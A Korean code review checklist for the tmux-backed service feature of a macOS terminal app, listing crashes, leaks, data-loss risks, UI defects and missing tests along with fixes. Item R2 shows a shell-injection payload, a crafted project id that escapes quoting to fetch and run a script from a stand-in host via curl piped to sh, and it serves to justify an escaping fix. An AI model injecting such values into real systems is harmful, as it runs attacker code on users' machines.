# 서비스 기능 코드 리뷰 — 발견 사항

리뷰 대상: 서비스(장수 프로세스) 기능 전체. HEAD `8bb56dc` 기준.
방식: 세 관점(정확성·엣지케이스 / 아키텍처·중복 / 보안·성능) 병렬 리뷰 + 핵심 항목 직접 검증(전 항목 실제 코드로 확인).

> **이 문서는 할 일 목록이다.** 고친 항목은 체크하고 커밋 해시를 적는다. 다 비면 이 문서를 지운다.
> 설계 근거는 [ARCHITECTURE.md](ARCHITECTURE.md) D19·§4.7, 현재 상태는 [STATUS.md](STATUS.md).

## 진행 그룹

- **1군 (지금)** — 데이터 소실·크래시·주입·기동 hang: C1 C2 C3 R1 R2 R4 R5
- **2군 (다음)** — UI 결함·오동작·중복: R3 R6 R7 R8 R9 R10 R11 R12 + Optional
- **별건** — AppState 분해(ServiceDockStore), 하드코딩 토큰화

---

## 🔴 Critical

### [ ] C1 — `remain-on-exit`가 세션 생성 *뒤에* 걸린다 → 즉사한 서비스의 exit code·로그 소실
`TmuxService.swift:127-129` — `new-session` 다음에 `applyServerOptions()`.
tmux 서버가 없는 상태(첫 서비스, 또는 GC가 마지막 세션을 죽여 서버가 내려간 뒤)에서 `new-session`이
서버를 새로 띄우는 순간엔 `remain-on-exit`가 아직 off다. 명령이 즉사하면(`command not found`,
`EADDRINUSE`) pane이 증발 → **exit code·마지막 로그 영구 소실**, 상태가 `.exited`가 아니라 `.missing`이라
`onExit` 미발화 = **알림도 배지도 안 뜸**. 서버가 살아있는 동안은 정상이라 **간헐적으로만** 터진다.
`startServices()`(AppState.swift:603-605)가 서비스마다 Task를 병렬로 띄워 인터리브까지 된다.

> ⚠️ 이건 STATUS·주석·설계 전반에 "필수라서 exit code·로그가 보존된다"고 적은 바로 그 보장이
> 실제로는 안 되는 경우다. 육안 검증이 서버가 살아있는 동안만 이뤄져 놓쳤다.

**수정**: `start-server` → `applyServerOptions()` → `new-session` 순서.
명령 조립을 순수 함수(`startCommands(...) -> [[String]]`)로 분리해 "remain-on-exit가 new-session보다
앞선다"를 테스트로 못 박는다.

### [ ] C2 — 포트 못 뽑는 서비스가 2초마다 영구히 `capture-pane`을 스폰한다 (실제 누수)
`ServiceMonitor.swift:72` — `where state == .running && ports[id] == nil`.
캐시는 "찾았을 때"만 기록하고 **"못 찾음"은 어디에도 안 남아** 조건이 영구 참: 포트 안 쓰는 것
(`tsc --watch`·워커·큐), 포트 줄이 스크롤백 60줄 밖으로 밀린 장수 서버, 호스트 접두 아닌 로그.
미확인 K개면 폴링 1회당 스폰 `1+K`, 2초 주기라 **K=1도 하루 43,200회**. fork/exec+파이프+매번
NSRegularExpression → App Nap·배터리에 직접 잡힌다. 바로 옆 주석은 "capture-pane은 아낀다"고 적혀 있다.

**수정**: `ports`를 조회 상태로 승격(`enum PortProbe { pending(attempts) / found(Int) / none }`).
콜드 컴파일로 포트를 늦게 찍는 경우가 흔하니 "N회 후 포기"보다 **백오프**(2→4→…→60s 상한, 재시작 시 리셋).

### [ ] C3 — 중복 serviceId가 앱을 크래시시킨다
`ServiceMonitor.swift:50` — `Dictionary(uniqueKeysWithValues:)`는 중복 키에서 fatalError.
state.v4.json은 사용자 편집 가능. 프로젝트 블록을 복붙하면 같은 serviceId가 둘 → 폴링 첫 틱에서
trap으로 죽음. **저장 파일 손상이 부팅 불가로 번진다.** 이 리포는 `SnapshotSanitize.clampAll`로 변조
스냅샷을 방어하는 원칙이 있는데 여기만 무방비.

**수정**: `Dictionary(services.map { ($0.id, $0) }, uniquingKeysWith: { a, _ in a })` — 한 줄.

---

## 🟠 Required

### [ ] R1 — `.origin`이 빈 문자열/공백이면 살아있는 워크트리 저장소를 삭제
`MuxaSupportDir.swift:68`(생성부 :101-105). `String(contentsOf:)`는 0바이트 파일에서 `""` 반환(nil 아님).
`guard let origin = store.origin`을 **통과** → `exists("")`=false → 유예(7일)만 지나면 `removeItem`으로
디렉터리 전체 삭제(state.v4.json·스크롤백·리뷰 코멘트). "근거 없으면 안 지운다"는 이 함수의 doctrine이
정확히 여기서 깨진다.
**수정**: `guard let origin = store.origin, !origin.isEmpty else { return false }` + collectGarbage 매핑에서 trim 결과 비면 nil로 접기.

### [ ] R2 — state.json에서 온 id가 셸로 탈출된다 (인용 이스케이프 누락)
`TmuxService.swift:154`(attachCommand)·`:166`(logCommand). 세션명을 작은따옴표로 감싸지만 **id 안의 `'`를
이스케이프하지 않는다.** 정답 패턴이 같은 종류의 코드 10줄 위(`TermView.swift:95`, `'`→`'\''`)에 이미 있다.
payload: state.json의 projectId를 `a'; curl -s http://evil/x.sh | sh; :'`로 → 도크 펼치는 순간 실행.
전제가 파일 쓰기 권한이라 Critical은 아니나, muxa는 **적대적 리포를 여는 게 본업**이라 현실적 persistence 수단.
**수정**: ① 세션명을 `'\''`로 이스케이프(즉효), ② `ServiceSession.name`이 id를 `[A-Za-z0-9-]+` 화이트리스트
검증(id에 `__`가 섞이면 parse가 조용한 좀비를 만드는 문제도 함께 막음). 공백 든 tmux 경로도 같이 인용.

### [ ] R3 — refresh가 취소를 안 봐서 삭제한 서비스 칩이 영구히 남는다
`ServiceMonitor.swift:27-41, 68-69`. 마지막 서비스 삭제 시 refresh가 `states()` await 중이면, sync가
`states=[:]`+cancel로 폴링을 멈춘 뒤 refresh가 재개해 아직 살아있는 세션을 보고 `states[삭제된id]=.running`로
덮어쓴다. 폴링이 멈춰 이 상태를 지울 사람이 없어 **삭제된 서비스가 running 칩으로 영구 잔존.**
**수정**: sync에서 세대 카운터를 올리고 refresh가 시작 시 캡처해 states/ports 대입 직전 비교(최소 `guard !Task.isCancelled`).

### [ ] R4 — 앱 기동이 로그인 셸 동기 실행에 매달린다 (타임아웃 없음)
`main.swift:62`. `collectServiceGarbage`→`isAvailable`→`executable` lazy 초기화가 `$SHELL -l -c`를
**창 생성(:106) 전에** 동기 실행 → 첫 페인트 100~500ms 지연. 더 나쁨: `capture`에 타임아웃이 없어
(`TmuxService.swift:71`) rc가 `nvm use`로 네트워크를 때리면 **앱이 창도 못 띄우고 영구 정지.**
**수정**: ① `collectServiceGarbage`/`startServices`를 첫 프레임 뒤 `DispatchQueue.main.async`로(이미 스크롤백
GC가 쓰는 패턴, main.swift:126), ② `capture`에 3초 워치독(초과 시 `terminate()` 후 fallback).

### [ ] R5 — `TmuxService.brew`가 뷰 body 평가마다 로그인 셸을 스폰
`TmuxService.swift:55` — `static var`(computed, 캐시 없음). `ServiceSetupView.swift:17` `brewInstalled`가
body에서 읽어, 무관한 @Observable 변화에도 재평가마다 로그인 셸 하나씩. 무거운 `.zshrc`면 200~500ms → 도크가 언다.
**수정**: `static let brew`(executable과 같은 캐시 규약 — brew는 재조회 불필요).

### [ ] R6 — start 실패가 완전 무성 (cwd 사라진 프로젝트에서 확실히 터짐)
`TmuxService.swift:123-130`, `AppState.swift:599-607`. `new-session -c <cwd>`는 cwd 없으면 exit≠0인데
반환값을 버린다. muxa는 워크트리를 만들고 지우는 앱이라, 워크트리 삭제 후 `project.path`가 state에 남으면
그 서비스는 영영 `.missing`, 시작 버튼 눌러도 무반응, 에러·로그·attention 전무.
**수정**: start가 Output을 반환하고 호출부가 exit≠0이면 `attention.recordSystem("서비스 시작 실패: \(name)")`.

### [ ] R7 — 인박스에서 "web 종료됨" 클릭 → 서비스 로그가 아니라 Git 패널이 열림
`AppState.swift:594-596 → 213-214 → 226-234`. `onExit`이 `tabId: service.id`로 기록 → `revealActivity`가
그 tabId를 UUID로 파싱해 탭을 찾는데, 서비스는 **탭 트리 밖**이라 그런 탭이 없어 프로젝트 이동 후
`showGitPanel=true`로 Git 패널만 열린다. 죽은 서버 사인 보러 가는 유일한 동선이 엉뚱한 패널을 연다.
**수정**: revealActivity에서 entry.tabId가 등록된 서비스 id면 `revealService(located)`로 라우팅.

### [ ] R8 — 도크 행이 색만으로 상태를 구분한다 (색맹 규칙 위반)
`ServiceDock.swift:93` — `Circle().fill(dotColor(status))`. `ServiceStatusStyle`의 선언("색만으로 구분하지
않는다", :6)과 DESIGN.md를 정면 위반. 팝오버 행은 글리프를 쓰는데 도크만 다르다.
**수정**: 도크·팝오버 행이 거의 같으니 공용 `ServiceRow(service:status:port:subtitle:selected:)`로 통합,
표식은 `ServiceStatusStyle.glyph`. 중복 제거(아래 Optional)와 접근성 수정이 한 작업이 된다.

### [ ] R9 — 설치 후 UI가 안 살아난다 (관측 불가 static)
`ServiceSetupView.swift:52`. 뷰 4곳(ServiceStrip:31,134,138 · ServiceDock:64,119 · ServicePopover:45,75)이
`TmuxService.isAvailable`(static)을 직접 읽어, `refresh()`가 성공해도 @Observable이 아니라 **푸터 칩·도크가
다시 안 그려진다.** `stillMissing` 로컬 상태는 증상 땜질. 뷰가 셸아웃(`refresh`)·전역 동작(`startServices`)을 직접 호출하는 것도 경계 위반.
**수정**: AppState(또는 ServiceDockStore)에 관측 가능한 `private(set) var servicesAvailable: Bool` +
`func retryTmuxDetection() -> Bool`. 뷰는 그것만 읽고, `stillMissing`은 반환값으로 대체.

### [ ] R10 — `ServicePopover.groups` 정렬 비교자가 불안정
`ServicePopover.swift:30` — `sorted { a, _ in a == currentProjectId }`는 엄격 약순서가 아니라 **현재
프로젝트가 맨 앞에 안 올 수 있다.**
**수정**: `order.filter { $0 == current } + order.filter { $0 != current }`. 그룹핑 로직을 `Service.swift`의
순수 함수(`groupServices(...) -> [ServiceGroup]`) + 테스트로.

### [ ] R11 — GC가 특정 경로에서 유령을 만든다 (막으려던 유령 그 자체)
`MuxaSupportDir.swift:80`, `AppInfo.swift:47-53`. `devKey`는 있지만 `worktreeRoot`가 nil(bundlePath에
`.build` 없음 — 개발 .app을 `.build` 밖으로 복사해 실행)이면 저장소는 생기는데 `.origin`을 못 남겨
orphans 보존규칙3("출처 모름")에 걸려 **영구 잔존.**
**수정**: `AppInfo.worktreeRoot ?? Bundle.main.bundlePath`로 스탬프(이 폴백은 `.build`가 경로에 없을 때만
쓰이므로 make clean 오판이 성립 안 함).
참고: devKey 해시 6자(24비트) 충돌은 워크트리 이름까지 같아야 하고 birthday로 ~수천 개에서야 문제 → 우선순위 낮음(원하면 `prefix(3)`→`prefix(4)`는 공짜).

### [ ] R12 — 죽은 코드 2개
- `ScriptSource.justfile`(`ProjectScripts.swift:36`) — 파서도 discover 분기도 없는데 `sourceLabel`(:194)이
  "just" 라벨을 렌더 → "just 지원되나 보다"라는 거짓 신호.
- `TmuxService.logCommand`(`:164`) — 아무도 호출 안 함(죽은 서비스는 `ServiceLogView`가 `capture`로 읽음).
**수정**: 둘 다 삭제(되살릴 땐 파서와 함께).

---

## 🟡 Optional

- [ ] **판정 중복 4곳** — "비정상 종료란 무엇인가"가 `ServiceStatusStyle.summarize`(:35)·`ServiceStrip.deadCount`(:151)·`AppState.startServices`(:592)·`ServiceDock.isDead`(:200) → `extension ServiceState { var isFailure: Bool }`.
- [ ] **`states[id] ?? .missing` 3곳** (ServiceDock:89·ServicePopover:106·ServiceStrip:146) → `ServiceMonitor.state(of id:) -> ServiceState`.
- [ ] **포트 캐시가 재시작을 살아남아 거짓 포트** (`ServiceMonitor.swift:69`) → `.running` 전이 시 `ports[id]=nil`, 또는 restart/remove가 `invalidatePort(id)` 호출.
- [ ] **runCommand 정책이 뷰에 갇힘** (`ServiceAddSheet.swift:137`, 진짜 정책이 여기 있고 `PackageManager.runCommand`는 조립만) → `ProjectScripts.command(for:manager:)` + pkg/make/sh 테스트.
- [ ] **세션에 pane 2개+면 상태 비결정적** (`Service.swift:90`, list-panes 마지막 줄이 이김) → pane index 0(`=<세션>:.0`)으로 타겟 고정.
- [ ] **`service.command` 평문 저장·표시** (`AppState.swift:993`, 0644) — `API_KEY=… pnpm dev` 노출. `.completeFileProtection`(0600) + ServiceAddSheet 안내문에 "토큰은 .env로" 한 줄. (알림 본문엔 name+exit code만 — 잘한 부분.)
- [ ] **악성 package.json UI 은폐** (`ServiceAddSheet.swift:168` truncation `.middle`이 payload를 접고, note가 명령 위·진한 색으로 위장) → 미리보기 truncation `.tail`, "추가" 직전 실행될 전체 문자열 확인 노출, 파서에서 스크립트 이름 `^[A-Za-z0-9._:-]+$` 검증 + note/body 제어문자·개행 제거(Makefile 타깃·sh 파일명도 같은 조립을 타므로 공통 적용).
- [ ] **하드코딩 수치** — `ServiceAddSheet.swift:160` `spacing: 1`(**Space 스케일에 없음** — 최소 tight=2), 팝오버 폭 300(:19) vs AttentionPanel 320, `.system(size: 28)`(`ServiceSetupView:23`, 이미 `EmptyState.iconSize`가 가진 결정), `EmptyState`가 있는데 빈 상태를 손으로 조립(ServiceDock:182·ServiceSetupView:20).
- [ ] **`Design/EmptyState` 재사용** — 위 빈 상태 둘을 `EmptyState(icon:title:subtitle:){버튼}`으로(subtitle 파라미터 추가).

## 🔵 Nit
- [ ] `ServiceMonitor.projectId(of:in:)`(`:81`)가 `async`인데 `await` 없고, parse해둔 projectId를 버리고 세션 딕셔너리 재탐색(O(N·M)) → refresh 루프에서 `serviceId→projectId` 맵을 들고 있으면 통째로 삭제.
- [ ] `parseMakefile`이 `foo::=bar`(POSIX 즉시 대입)를 타깃으로 오인(`ProjectScripts.swift:101`, `after.hasPrefix("=")`가 `:=`를 못 잡음). 목록만 지저분, 파괴적 아님.
- [ ] 백그라운드에서도 2초 폴링 지속 → App Nap 무력화. `didResignActiveNotification`에서 10~30초로.
- [ ] 같은 WHY 주석 3번 복붙(도크 오버레이 이유 · "다른 워크스페이스 dev 서버" 이유) → D19 포인터로. (zsh EQUALS·remain-on-exit·소켓 격리 주석은 그대로 두기 — 강점.)

---

## 아키텍처 — 별건

`AppState.swift` **1065줄**(프로젝트 규칙 200~300)은 실재 문제지만 **서비스만 빼서는 못 맞춘다** —
AppState는 이미 영속·빠른 전환기·크롬 액션·배지까지 껴안은 god object이고 서비스는 최근 입주자일 뿐이다.

- [ ] **영속 안 되는 런타임 상태만 `ServiceDockStore`로** (약 70줄): `showServiceDock`·`selectedServiceId`·
  `serviceAddRequested`·`dockTerms`·`serviceRestartSeq`·`dockTerm`·`open/closeServiceDock`·`requestAddService`·
  `dropDockTerm`. `app: ghostty_app_t`만 필요해 백레퍼런스 없이 깨끗이 떨어짐(TerminalStore 패턴과 동형).
- CRUD(`addService`/`removeService`/`restartService`/`startServices`/`killServices`/`collectServiceGarbage`)는
  workspaces(값 타입) 편집+`save()`라 AppState에 남긴다. **통짜 `ServiceStore`는 만들지 말 것 — 복잡도 이동일 뿐.**
- 트리 순회 함수 중복 정리: `AppState.allServices`·`AppState.locate`는 `collectAllServices`(순수)의 재구현 →
  삭제하고 `allLocatedServices` 재사용. `ServiceMonitor.projectId(of:in:)`도 함께 소멸(위 Nit).
- `SessionPersistence`(save/load/Persisted) 추출은 이 리뷰 범위 밖의 또 다른 별건.

## 테스트 공백 (가장 아픈 곳)

- [ ] **`ServiceMonitor` 테스트 0개.** `onExit`이 running→exited 전이에서 정확히 1회만 발화하는가,
  취소 후 stale write 없는가(R3), 재시작 후 포트 무효화 — **알림의 유일한 결정론적 신호인데 검증 전무.**
  `TmuxService.states`/`capture`를 클로저 주입 가능하게 하면 전부 순수 테스트화.
- [ ] **`TmuxService.start` 명령 순서 테스트 없음**(C1). 인자 배열을 만드는 순수 함수(`startCommands(...) -> [[String]]`)로 분리하면 "remain-on-exit가 new-session보다 앞선다"를 못 박을 수 있다.
- [ ] **orphans에 빈 문자열 origin 케이스 없음**(R1). `DevStoreGCTests`는 `origin: nil`만 덮어 이 구멍이 산다.
- [ ] 중복 serviceId 방어 테스트 없음(C3).
- [ ] parse에 `__` 든 id / orphans에 파싱 불가 세션 섞인 케이스 없음.

---

## 리뷰가 잘 봐준 것 (유지)

zsh EQUALS 확장 인용 · `remain-on-exit` 개념(순서만 문제) · 소켓·저장소 격리 · GC "의심되면 안 지운다" 원칙 ·
순수/경계 분리 골격 · 알림 본문에 command 안 넣은 것 · 풍부한 WHY 주석. 이 리포의 강점이다.
